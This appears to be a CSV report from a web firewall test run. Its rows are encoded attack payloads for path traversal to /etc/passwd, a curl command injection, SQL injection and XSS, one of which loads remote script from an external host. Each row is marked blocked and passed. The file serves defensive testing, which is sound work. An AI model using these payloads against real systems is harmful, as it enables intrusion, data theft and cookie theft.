Payload,Check Status,Response Code,Placeholder,Encoder,Set,Case,Test Result
%25C0%25AE%25C0%25AE%25C0%25AF%25C0%25AE%25C0%25AE%25C0%25AFetc%25C0%25AFpasswd,blocked,403,JSONRequest,URL,community,community-lfi,passed
file:%2F%2F%2Fetc%2F.%2Fpasswd,blocked,403,JSONRequest,URL,community,community-lfi,passed
%60curl%20-L%20http:%2F%2F%E2%92%BC%E2%93%84%E2%93%84%E2%92%BC%E2%93%81%E2%92%BA.%E2%92%B8%E2%93%84%E2%93%82%60,blocked,403,JSONRequest,URL,community,community-rce,passed
%28select%2520group_concat%28table_name%2C0x3a%2Ccolumn_name%2C0x5c6e%29%2520from%2520information_schema.columns%2520where%2520table_schema=database%28%29%29,blocked,403,JSONRequest,URL,community,community-sqli,passed
%2F%2A%21%2555NiOn%2A%2F%2520%2F%2A%21%2553eLEct%2A%2F+,blocked,401,JSONRequest,URL,community,community-sqli,passed
-1945+%2F%2A%21%2555NiOn%2A%2F%2520%2F%2A%21%2553eLEct%2A%2F+1%2C2%2C3%2C%2527soy%2520vulnerable%2527%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19+--+,blocked,403,JSONRequest,URL,community,community-sqli,passed
javascript:%25ef%25bb%25bfalert%28XSS%29,blocked,403,JSONRequest,URL,community,community-xss,passed
%3CsvG%2Fx=%22%3E%22%2FoNloaD=confirm%28%29%2F%2F,blocked,403,JSONRequest,URL,community,community-xss,passed
alert%3F.%28document%3F.cookie%29,blocked,403,JSONRequest,URL,community,community-xss,passed
%3Cobject%2Fdata=javascript:alert%28%29%3E,blocked,403,JSONRequest,URL,community,community-xss,passed
%3Ca%20href=javas%2526%2399%3Bript:prompt%2526%23x28document.domain%29%3Exss,blocked,403,JSONRequest,URL,community,community-xss,passed
%22%3E%3Cvideo%3E%3Csource%20onerror=eval%28atob%28http:%2F%2Fsome_host%29%29%20id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&%2361%3B&%2361%3B%3E,blocked,403,JSONRequest,URL,community,community-xss,passed
%3CxssBypass%2Fonpointermove=%28confirm%29%281%29%3EMoveMouseHere,blocked,403,JSONRequest,URL,community,community-xss,passed
Tarun~%3C%22%3E%3Cdetails%2Fopen%2Fontoggle=%22jAvAsCrIpT&colon%3Balert&lpar%3B%2Fxss-by-tarun%2F&rpar%3B%22%3EXXXXX%3C%2Fa%3E,blocked,403,JSONRequest,URL,community,community-xss,passed
%3Cvideo%20src=x%20onerror=%22prompt%28xss%22%3E,blocked,403,JSONRequest,URL,community,community-xss,passed
%3Ciframe%20src=%22java%20sc%20ript:al%20ert%28%29%22%3E%3C%2Fiframe%3E,blocked,403,JSONRequest,URL,community,community-xss,passed
%253Cx%2FOnpointerrawupdate=confirm%2526lpar%3B%29%253Exxxxx,blocked,403,JSONRequest,URL,community,community-xss,passed
eval%28atob%28%22YWxlcnQoKQ==%22%29%29,blocked,403,JSONRequest,URL,community,community-xss,passed
document%5B%22cookie%22%5D,blocked,403,JSONRequest,URL,community,community-xss,passed
%3Cimg%20src%20onerror=confirm%281%29%3E,blocked,403,JSONRequest,URL,community,community-xss,passed
